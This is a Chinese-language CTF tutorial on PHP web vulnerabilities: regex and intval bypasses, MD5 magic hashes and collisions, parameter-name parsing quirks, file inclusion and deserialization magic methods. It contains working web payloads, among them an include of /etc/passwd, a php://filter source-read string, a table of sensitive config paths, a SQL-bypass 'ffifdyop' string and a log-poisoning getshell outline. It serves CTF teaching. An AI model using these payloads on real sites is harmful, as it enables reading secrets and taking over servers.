<h1 id="Ntja6">PHP语言的特性</h1>
<h2 id="axDA3">1.正则函数</h2>
<h3 id="ijaP5">数组绕过</h3>
```php
if(preg_match("/[0-9]/", $unjoke)){
  die("you are joker");
}
else(intval($unjoke)){
  echo $flag;
}

//intval：用于获取变量的整数值;通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer数值
```

这行代码要求`$num`不能是一个数字但是`intval($num)`又要求你的变量是数字，这个时候你问`gpt`他就会告诉你这是矛盾的

这个时候就要引入一下**php函数**的数组绕过了

**原理：****<font style="color:rgb(34, 34, 34);">preg_match第二个参数subject要求是</font>****<font style="color:#DF2A3F;">字符串</font>****<font style="color:rgb(34, 34, 34);">，如果传入数组时会返回false,则不会进入if语句</font>**

```php
payload：unjoke[]=1 
```

<h3 id="dcLYf">%0a换行符绕过</h3>
先来看一个正则表达式：`preg_match('/^unjoke$/')`

学习过正则的肯定知道这个是匹配一个`unjoke`字符串，看如下例子

```php
<?php
$cmd = $_GET['you'];
if(preg_match('/^unjoke$/', $cmd) && $cmd !== 'unjoke'){
  echo 'yes, you are good!'
  #eval('')
}
```

这个时候要求你传入进来的是`unjoke`字符串但是又不能被正则匹配，还是一个矛盾式，这个时候就可以用换行符绕过

**原理：空模式下的正则不会匹配第二行**

```php
payload:you=unjoke%0a

joke
```

<h3 id="gLVkw">PCRE回溯次数限制</h3>
这个单独留作业，自己了解一下

<h2 id="DT93g">2.intval函数</h2>
<font style="color:rgb(34, 34, 34);">这个前面讲过一点了，就重复一下吧</font>

<font style="color:rgb(34, 34, 34);">定义:用于获取变量的整数值;通过使用指定的进制 base 转换（默认是十进制），</font><font style="color:#DF2A3F;">返回变量</font>`<font style="color:#DF2A3F;">var</font>`<font style="color:#DF2A3F;">的</font>`<font style="color:#DF2A3F;">integer</font>`<font style="color:#DF2A3F;">数值</font><font style="color:rgb(34, 34, 34);">。</font>`<font style="color:rgb(34, 34, 34);">intval()</font>`<font style="color:rgb(34, 34, 34);">不能用于</font>`<font style="color:rgb(34, 34, 34);">object</font>`<font style="color:rgb(34, 34, 34);">。</font>

**<font style="color:rgb(34, 34, 34);">基本语法</font>**

```php
int intval ( mixed $value [, int $base = 10 ] )

参数说明：

$value：要转换成整数的变量。
$base（可选）：转换所使用的进制，默认是 10（十进制）。
返回值：

成功时，返回 $value 的整数值。
失败时，返回 0。
空数组返回 0，非空数组返回 1。

$a = '12';
$a = 12;
```

<h3 id="ctVSi">进制转换绕过</h3>
要先了解官方文档中注意的内容

![](https://cdn.nlark.com/yuque/0/2024/png/42549390/1722759234677-14987bb1-b61b-4ddb-8e78-4be2a31ee405.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_838%2Climit_0)

**第一种情况**

```php
if($num === "1234"){
        die("no no no!");
    }
if(intval($num,0)===1234){
        echo $flag;
    }
else{
        echo intval($num,0);
    }
```

注意第一个`if`是字符串的比较，所以可以利用进制转化进行绕过

```php
0b?? : 二进制
0??? : 八进制
0x?? : 十六进制
```

payload：

```php
num = 0x4D2（十六进制）

$num = '0x4D2'
```

**第二种情况**

```php
if($num==1234){
        die("no no no!");
    }
    if(preg_match("/[a-z]|[A-Z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==1234){
        echo $flag;
    }
```

这个例子利用正则把字母`ban`掉了，这个时候就要用到八进制了

payload：

```php
num = 02322
```

<h3 id="UdoWu">字母绕过</h3>
看一下`intval函数`的一个性质

+ 转换字符串时, 会从字符串的开始进行转换,直到遇到一个非数字的字符,如果字符串的第一个字符不是整数,则返回0

那么如下情况你就可以使用这个性质，进行绕过

```php
if($num == 1234){
        die("no no no!");
    }
    if(intval($num,0)==1234){
        echo $flag;
    }
```

这个时候你就可以传入

```php
num = 1234a

$num = '1234a1234'

```

<h3 id="RyzeI">小数点绕过</h3>
当题目`ban掉了字母和0`，这个时候你就需要小数点绕过了

```php
if($num==="114514"){
        die("no no no!");
    }
    if(preg_match("/[a-z]|[A-Z]/i", $num)){  //禁用字母
        die("no no no!");
    }
    if(!strpos($num, "0")){        //禁止0开头
        die("no no no!");
    }
    if(intval($num,0)===114514){
        echo $flag;
    }
```

这个时候你就可以传入

```php
num = 114514.114514
```

intval函数会帮你把它转换成整形，以此达到绕过的目的

<h3 id="XnRAA">数组绕过</h3>
当`intval`转换数组时，只会关心数组有没有内容，而不会在乎数组里面是什么

![](https://cdn.nlark.com/yuque/0/2024/png/42549390/1711499971009-94b24246-aa99-4457-95ed-53cc2fdae163.png?x-oss-process=image%2Fformat%2Cwebp)

<h2 id="kczG2">3.MD5函数绕过</h2>
<h3 id="st0u8">md5函数</h3>
在PHP中，`md5()`函数用于计算字符串的MD5哈希值。

**语法：**

```php
md5(string $str, bool $raw_output = false): string
```

**参数：**

+ `str`：必需。要计算的字符串。
+ `raw_output`：可选。如果为`true`，返回原始的16字符二进制格式；如果为`false`（默认），返回32字符的十六进制数。

**示例：**

```php
<?php
$str = "Hello, World!";
$hash = md5($str);
echo $hash; // 输出：fc3ff98e8c6a0d3087d515c0473f8677
?>
```

<h3 id="cUhFB">假设题目是<font style="color:#DF2A3F;">$md5==md5($md5)</font></h3>
<font style="color:#000000;">0e开头的数且md5加密后还是0e，</font>`<font style="color:#000000;">md5=0e215962017</font>`

<h3 id="clv4O"><font style="color:#000000;">假设是弱比较</font><font style="color:#DF2A3F;">md5($a)==md5($b)</font></h3>
<font style="color:#DF2A3F;">== 判断</font>，php中==左右两个变量的类型若<font style="color:#DF2A3F;">不相等</font>，则会<font style="color:#DF2A3F;">转换</font>成相等的类型后再进行判断。

PHP在处理哈希字符串的时候，它把每一个以0E开头并且后面字符均为纯数字的哈希值都解析为0

```php
//md5加密后以0E开头，且后面均为纯数字
QNKCDZO
240610708
s878926199a
s155964671a

//md5加密后变成万能密码
ffifdyop

//sha1加密后以0E开头，且后面均为纯数字
aaroZmOk
aaK1STfY
```

<h3 id="mSHaR">若使用的是**<font style="color:rgba(0, 0, 0, 0.85);">强类型</font>**</h3>
**<font style="color:rgba(0, 0, 0, 0.85);">md5强类型绕过</font>**

```php
(string)$_POST['a1']!==(string)$_POST['a2'] && md5($_POST['a1'])===md5($_POST['a2'])
```

则需要左右两个变量类型相等且值相等才会返回true，这时候就需要选择md5后散列值完全相等的一对字符串传入了

```php
array1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

fastcoll

<h3 id="si9ym">数组绕过强比较</h3>
**<font style="color:rgb(34, 34, 34);">原理:MD5无法处理数组，如果传入数组则返回NULL，两个NULL是相等的。</font>**

<font style="color:rgb(34, 34, 34);">看如下例子</font>

```php
if ($_GET['unjoke_a'] != $_GET['unjoke_b']){
	if (md5($_GET['unjoke_a']) === md5($_GET['unjoke_b'])){
		echo $flag;
	}
else{
	print 'Wrong.';
	}
}
```

payload如下：

```plain
http://url?unjoke_a[]=1&unjoke_b[]=2
```

<h2 id="q29HV">4.字符串解析特性</h2>
<font style="color:rgb(34, 34, 34);">PHP语言会将所有参数转换为有效的变量名，就是在解析字符串时：</font>

> <font style="color:rgb(34, 34, 34);">1）删除空白符</font>
>
> <font style="color:rgb(34, 34, 34);">2）将某些字符([,+,.)等等转换为下划线（包括空格）</font>
>

这个时候又可以整出一些考点了，就比如

```php
GET或POST方式传进去的变量名,会自动将(空格) + . [   
这四个个字符任何一个都行，都可以被处理成_
```

用之前结束的newsatr的部分waf来举例子

```php
$_GET['NewStar_CTF.2024'] !== 'Welcome' && preg_match('/^Welcome$/', $_GET['NewStar_CTF.2024'])
```

这个你要是直接传入`NewStar_CTF.2024=Welcome%0a`就会被解析成`NewStar_CTF_2024=Welcome%0a`

在`PHP_7`中，可以使用`[`字符的非正确替换漏洞。当传入的参数名中出现`[`且之后没有`]`时，PHP 会将`[` 替换为`_`，但此之后就不会继续替换后面的特殊字符了，因此`GET`传参`NewStar[CTF.2024=Welcome%0a` 

<h2 id="wWngw">5.其他函数</h2>
还有一些其他函数的绕过这里留作业，自己了解一下

+ <font style="color:rgb(35, 38, 59);">is_numeric()函数</font>
+ <font style="color:rgb(35, 38, 59);">strcmp()函数</font>
+ <font style="color:rgb(35, 38, 59);">sha1()函数</font>
+ <font style="color:rgb(35, 38, 59);">extract()函数</font>
+ <font style="color:rgb(35, 38, 59);">in_array()函数</font>
+ <font style="color:rgb(35, 38, 59);">parse_str()变量覆盖</font>

参考文章[ctf中常见php漏洞 - dtwin - 博客园](https://www.cnblogs.com/dtwin/p/17796132.html)

<h1 id="UFCVk">文件包含</h1>
<h2 id="pagLg">1.文件包含漏洞含义以及成因</h2>
服务器执行`PHP文件`时，可以通过文件包含函数加载另一个文件中的`PHP代码`，并且当`PHP`来执行，这会为开发者节省大量的时间。这意味着你可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，你只更新一个包含文件就可以了，或者当你向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）

**利用条件：**

```php
（1）include()等函数通过动态变量的方式引入包含文件。

（2）用户能够控制该动态变量。
```

**文件包含函数：**

```php
1.include()：在执行期间包含并运行指定文件的内容。如果文件不存在或包含错误，include()会生成警告（E_WARNING），但脚本会继续执行。

2.include_once()：与include()类似，但如果文件已被包含，则不会再次包含，避免函数重定义或变量重复赋值的问题。

3.require()：与include()功能相似，但在文件不存在或包含错误时，会生成致命错误（E_COMPILE_ERROR），并停止脚本执行。

4.require_once()：与require()类似，但如果文件已被包含，则不会再次包含。

5.file_get_contents()：读取文件的内容并将其作为字符串返回。

6.readfile()：读取文件并直接输出其内容。

7.fopen()：打开文件或 URL，返回文件指针资源，可用于读取或写入操作。

8.highlight_file()：用于对指定文件的代码进行语法高亮显示。 它会根据PHP内置的语法高亮器定义的颜色，将文件内容以高亮格式输出或返回。
```

<h2 id="RNpL8">2.读取敏感文件</h2>
```php
<?php
    include($_GET['unjokefile']); 
?>

//传入?unjokefile=/etc/passwd
```

不存在`waf`的情况下随便读取，给一个常见的敏感文件表格

| 目录 | 内容 |
| :---: | :---: |
| /etc/passwd | Linux系统账号信息 |
| /etc/httpd/conf/httpd.conf | Apache配置信息 |
| /etc/my.conf | MySQL配置信息 |
| /usr/etc/php.ini | PHP配置信息 |


<h2 id="HFEY9">3.利用封装伪协议读取源码</h2>
```php
?unjokefile=php://filter/read=convert.base64-encode/resource=flag.php
```

我这里就只是告诉你们这些个利用手段，其余的`伪协议`还得你们自己学一学

<h2 id="aBKhW"><font style="color:rgba(0, 0, 0, 0.8);">4.包含日志文件Getshell</font></h2>
**条件：**知道日志文件`access.log`的存放位置 ，`Apache`默认位置：`/var/log/httpd/access_log`，`Apache2`是`/var/log/apache2/access.log`，`nginx`默认位置：`<font style="color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);">/var/log/nginx/access.log</font>`

**利用方法：**

就是改请求包的对应部分进行`getshell`，用`hackbar`和`burpsuite`都行，就比如下图

![](https://cdn.nlark.com/yuque/0/2024/png/42549390/1727235536506-cbb41b3d-76c7-4c38-a0f5-ed33ab438406.png?x-oss-process=image%2Fformat%2Cwebp)

<h2 id="PBHyb">5.参考文章</h2>
```php
https://www.cnblogs.com/Zeker62/p/15322771.html#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%AE%9A%E4%B9%89
https://wiki.wgpsec.org/knowledge/web/fileincludes.html#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8
```

<h1 id="AJxph">PHP反序列化</h1>
<h2 id="HYcX5">1.序列化之后的格式</h2>
![](https://cdn.nlark.com/yuque/0/2024/png/42549390/1721225397121-9ecdb1dd-649b-4c5f-8eae-314c8ef9b434.png)



注意的是`private和protected成员`的序列化会有所不同如下例子

```php
<?php
class test{
    private $pub = 'benben';
    protected $b = 'asd';
    function jineng(){
        echo $this->pub;
    }
}
$a = new test();
echo serialize($a);
?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/42549390/1721225796276-85440083-bd1c-4dc0-a9a5-4faff49dd3a1.png)

里面的空字符url编码是%00

<h3 id="Spvn1">各种类型的标识</h3>
```markdown
a - array
b - boolean
d - double
i - integer
o - common object
r - reference
s - string
S - 转义后的内容（识别16进制的转义字符串，但是转义字符串表示不带x，如\6c）
C - custom object
O - class
N - null
R - pointer reference
U - unicode string
```

```php
<?php
 class Person {
     public $name;
     public $age;
     public $gender;
     protected $salary;
     private $address;
     public function __construct($name, $age, $gender, $salary, $address) {
         $this->name = $name;
         $this->age = $age;
         $this->gender = $gender;
         $this->salary = $salary;
         $this->address = $address;
     }
 }

 $unjoke = new Person('unjoke', '100', 'man', 50, 'china');

 echo serialize($unjoke);
 echo "\n";
 var_dump(serialize($unjoke));
 echo "\000"."\n";
 echo urlencode("\000");
 echo "\n";
 echo base64_encode("\000");
```

<h2 id="ftUJU">2.常见魔术方法</h2>
```php
__destruct()， 对象销毁的时候调用
__toString()， 类被当成字符串时的回应方法
__construct()，当对象创建(new)时会自动调用，注意在unserialize()时并不会自动调用
__sleep()，serialize()时会先被调用，__sleep()先执行再序列化
__call()，在对象中调用一个不可访问方法时调用
__callStatic()，用静态方式中调用一个不可访问方法时调用
__get()，调用一个不存在的成员变量触发
__set()，设置一个不存在的或者不可访问的类的成员变量时调用
__isset()，当对不可访问属性调用isset()或empty()时调用
__unset()，当对不可访问属性调用unset()时被调用。
__wakeup()，执行unserialize()时，先会调用这个函数
__invoke()，调用函数的方式调用一个对象时的回应方法
__set_state()，调用var_export()导出类时，此静态方法会被调用。
__clone()，当对象复制完成时调用
__autoload()，尝试加载未定义的类
__debugInfo()，当调用 var_dump() 输出一个对象时
```

<h3 id="MeHjO">1.__call( )</h3>
```php
class google
{
    public function search()
    {
    }
    public function __call($method, $parameters)
    {
       var_dump($parameters);
    }
}

$google = new google();
$keyword = array("poc"=>"a");
$google->search($keyword);
$google->operate($keyword);
?>
```

结果：

![](https://cdn.nlark.com/yuque/0/2024/png/42549390/1723303913123-9b8c7bf0-e872-4549-8f12-ffa6d0be2001.png)

<h3 id="MOtd4">2.__get( )</h3>
把不存在的成员属性的名称赋值给参数

```php
<?php
class test{
    public $aa;
    function __get($a) {
        echo $a;
    }
}
$b = new test();
$b->p;
?>
结果就是输出
p
```

<h3 id="PnHe4">3.__set( )</h3>
把调用的属性名称赋值给第一个参数，属性的值赋值给第二个参数

```php
<?php
class NotExists{
    public function __set($b,$c)
    {
        echo $b . '-----' . $c;
    }
}
$ne = new NotExists();
$ne->libai = 'xiaoba';
?>
输出结果为：
libai-----xiaoba
```

<h2 id="yv9wG">3.自主学习部分</h2>
> 字符串逃逸
>
> phar反序列化
>

题目：http://localhost/classshow/1.php



